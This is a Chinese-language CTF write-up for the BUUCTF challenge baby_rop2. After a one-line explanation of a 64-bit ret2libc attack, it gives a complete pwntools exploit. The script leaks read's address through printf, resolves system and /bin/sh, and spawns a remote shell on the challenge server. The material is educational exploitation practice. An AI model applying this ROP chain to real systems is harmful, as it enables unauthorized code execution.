# 分析

来自[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2)

这是一道ret2libc(64)的题，这题使用printf来泄露read_got的地址，涉及到printf的rdi、rsi的传参问题

# exp

```python
from pwn import *
from LibcSearcher import *
context(os='linux',arch='amd64',log_level="debug")
#p=process('./babyrop2')
p=remote('node5.buuoj.cn',29480)
elf=ELF('./babyrop2')
libc=ELF('./libc.so.6')
printf_plt=elf.plt['printf']
read_got=elf.got['read']
main_addr=elf.sym['main']

pop_rdi=0x400733
pop_rsi=0x400731
str_addr=0x400770
ret_addr=0x4004d1   #必要时加上这个对齐栈
payload1=flat(cyclic(0x28),p64(pop_rdi),p64(str_addr),p64(pop_rsi),p64(read_got),p64(0),p64(printf_plt),p64(main_addr))
p.sendlineafter(b'name? ',payload1)
read_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print(hex(read_addr))

###########################
#本地libc打法
base = read_addr-libc.sym['read']
sys_addr=base+libc.sym['system']
#bin_sh=0x18CD57
#bin_sh=base+bin_sh
bin_sh=base+next(libc.search(b'/bin/sh'))
############################

#使用LibcSearcher打法
libc=LibcSearcher('read',read_addr)
base=read_addr-libc.dump('read')
sys_addr=base+libc.dump('system')
bin_sh=base+libc.dump('str_bin_sh')

payload2=flat(cyclic(0x28),p64(pop_rdi),p64(bin_sh),p64(sys_addr)) #可以加上ret_addr，栈平衡
p.sendline(payload2)
p.interactive()
```

